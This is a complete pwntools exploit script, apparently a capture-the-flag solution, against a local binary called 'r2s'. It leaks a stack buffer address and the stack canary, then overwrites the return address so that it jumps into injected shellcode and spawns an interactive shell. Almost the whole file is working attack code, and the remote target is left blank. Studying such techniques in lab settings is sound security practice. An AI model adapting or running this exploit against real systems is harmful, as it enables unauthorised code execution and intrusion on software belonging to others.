#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'  
exe = context.binary = ELF('./r2s', checksec=False)


# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda msg: p.recv(msg)
rn = lambda msg: p.recvn(msg)
rl = lambda: p.recvline()
rul = lambda msg: p.recvuntil(msg)
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*0x000055555540096c
c
''')

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

# Use when leaked is needed
rul(b'buf: ')
buf = int(p.recvline()[:-1], 16) # Adjust this
info("[+] Leak: " + hex(buf))

rul(b'$rbp: ')
buf2sfp = int(rl().split()[0])
buf2cnry = buf2sfp - 8
info('[+] buf <=> sfp: ' + hex(buf2sfp))
info('[+] buf <=> canary: ' +  hex(buf2cnry))

payload = b'A'*(buf2cnry + 1)
sa(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
info('[+] Canary: ' + hex(cnry))

sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
p.sendlineafter(b'Input:', payload)


p.interactive()
